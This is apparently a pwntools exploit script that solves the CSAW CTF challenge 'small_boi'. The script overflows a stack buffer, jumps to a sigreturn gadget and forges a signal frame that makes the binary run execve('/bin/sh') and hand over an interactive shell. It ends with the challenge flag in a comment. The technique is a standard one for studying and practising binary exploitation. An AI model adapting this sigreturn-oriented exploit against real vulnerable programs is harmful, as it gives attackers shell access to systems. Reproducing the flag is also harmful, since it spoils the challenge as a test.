from pwn import *
import struct


# sys_exec("/bin/sh", 0, 0)


context.terminal = ['tmux', 'split-w', '-h']

gdbscript = """
gef
start
"""
# io = gdb.debug(["./small_boi"], aslr=False, gdbscript=gdbscript)
io = process('./small_boi')
# io = remote("pwn.chal.csaw.io", 1002)

payload = ""
payload += 'A' * 0x28
payload += p64(0x0000000000400180)  # sys_rt_sysreturn
payload += 'BBBBBBBB' * 5

base_stage = 0xdeadbeaf
addr_syscall = 0x0000000000400185

# sigreturn oriented programming attack
fake_frame = ''
fake_frame += struct.pack('<Q', 0) * 8              # r8-r15
fake_frame += struct.pack('<Q', 0x4001ca)                  # rdi
fake_frame += struct.pack('<Q', 0)         # rsi
fake_frame += struct.pack('<Q', 0)                  # rbp
fake_frame += struct.pack('<Q', 0)                  # rbx
fake_frame += struct.pack('<Q', 0)                # rdx
fake_frame += struct.pack('<Q', 59)                  # rax
fake_frame += struct.pack('<Q', 0)                  # rcx
fake_frame += struct.pack('<Q', base_stage)         # rsp
fake_frame += struct.pack('<Q', addr_syscall)       # rip
fake_frame += struct.pack('<Q', 0)                  # eflags
fake_frame += struct.pack('<Q', 0x33)               # csgsfs
fake_frame += 'AAAAAAAA' * 4
fake_frame += struct.pack('<Q', 0)                  # &fpstate

payload += fake_frame


io.sendline(payload)

io.interactive()


# flag{sigrop_pop_pop_pop}

